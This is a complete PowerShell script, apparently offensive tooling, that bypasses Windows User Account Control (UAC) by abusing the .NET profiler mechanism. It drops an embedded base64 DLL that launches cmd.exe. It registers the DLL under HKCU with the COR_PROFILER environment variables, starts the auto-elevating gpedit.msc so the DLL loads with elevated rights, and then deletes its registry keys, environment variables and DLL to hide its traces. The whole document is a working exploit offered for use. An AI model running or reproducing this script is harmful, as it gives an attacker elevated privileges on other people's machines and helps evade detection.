# Bypass UAC with a .NET profiler DLL

# GUID, path and content
$GUID = '{' + [guid]::NewGuid() + '}'
$DllPath = $env:TEMP + "\test.dll"
$DllBytes64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADXHurFk3+ElpN/hJaTf4SWsR+Fl5B/hJaTf4WWkX+EligejJeRf4SWKB6Gl5J/hJZSaWNok3+ElgAAAAAAAAAAUEUAAGSGAwAgMyBZAAAAAAAAAADwACIgCwIOCgACAAAABgAAAAAAAAAQAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAQAAAAAAAACAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAAAAAAAAAAA4CEAACgAAAAAAAAAAAAAAAAwAAAMAAAAAAAAAAAAAAAAAAAAAAAAACAgAABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAA7AAAAABAAAAACAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAARgIAAAAgAAAABAAAAAYAAAAAAAAAAAAAAAAAAEAAAEAucGRhdGEAAAwAAAAAMAAAAAIAAAAKAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7ChIuGNtZC5leGUASIlEJEiD+gF0CrgBAAAASIPEKMO6AQAAAEiNTCRI/xXODwAAM8n/Fc4PAADMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALiIAAAAAAAAgIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIDMgWQAAAAACAAAAbwAAAJAgAACQBgAAAAAAACAzIFkAAAAADAAAABQAAAAAIQAAAAcAAAAAAAAgMyBZAAAAAA0AAADEAAAAFCEAABQHAAAAAAAAIDMgWQAAAAAOAAAAAAAAAAAAAAAAAAAAUlNEU264YWySs5BInHEEyuVN54wQAAAAQzpcVXNlcnNcYXVkaXRvclxkb2N1bWVudHNcdmlzdWFsIHN0dWRpbyAyMDE3XFByb2plY3RzXFRlc3RETExceDY0XFJlbGVhc2VcVGVzdERMTC5wZGIAAAAAAAACAAAAAAAAAAAAAAAAAAAAR0NUTAAQAAA7AAAALnRleHQkbW4AAAAAACAAACAAAAAuaWRhdGEkNQAAAAAgIAAAcAAAAC5yZGF0YQAAkCAAAEgBAAAucmRhdGEkenp6ZGJnAAAA2CEAAAgAAAAueGRhdGEAAOAhAAAUAAAALmlkYXRhJDIAAAAA9CEAABQAAAAuaWRhdGEkMwAAAAAIIgAAGAAAAC5pZGF0YSQ0AAAAACAiAAAmAAAALmlkYXRhJDYAAAAAADAAAAwAAAAucGRhdGEAAAEEAQAEQgAACCIAAAAAAAAAAAAAOCIAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4iAAAAAAAAICIAAAAAAAAAAAAAAAAAAGABRXhpdFByb2Nlc3MAAQZXaW5FeGVjAEtFUk5FTDMyLmRsbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA7EAAA2CEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# create registry keys
Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\$($GUID)"
New-Item -Path HKCU:\Software\Classes\CLSID\$GUID\InprocServer32 -Value $DllPath -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value $GUID -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value $DllPath -Force | Out-Null

# set env variables
[Environment]::SetEnvironmentVariable("COR_ENABLE_PROFILING", "1", "User")
[Environment]::SetEnvironmentVariable("COR_PROFILER", $GUID, "User")
[Environment]::SetEnvironmentVariable("COR_PROFILER_PATH", $DllPath, "User")
Set-Item -path env:COR_ENABLE_PROFILING -value ("1")
Set-Item -path env:COR_PROFILER -value ($GUID)
Set-Item -path env:COR_PROFILER_PATH -value ($DllPath)

# dropping DLL
Write-Host "Dropping DLL to $DllPath..."
[Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
Set-Content -Value $DllBytes -Encoding Byte -Path $DllPath

# run mmc
Write-Host "Running MMC..."
Start-Process -FilePath gpedit.msc

# wait before cleanup
Sleep 5

# remove registry keys, DLL and env variables
Write-Host "Cleanup..."
Remove-Item -Path HKCU:\Software\Classes\CLSID\$GUID -Recurse -Force
Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" 
Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER"
Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH"
Remove-Item -Force $DllPath
[Environment]::SetEnvironmentVariable("COR_ENABLE_PROFILING", $null, "User")
[Environment]::SetEnvironmentVariable("COR_PROFILER", $null, "User")
[Environment]::SetEnvironmentVariable("COR_PROFILER_PATH", $null, "User")
Remove-Item Env:\COR_ENABLE_PROFILING
Remove-Item Env:\COR_PROFILER
Remove-Item Env:\COR_PROFILER_PATH

Write-Host "Done"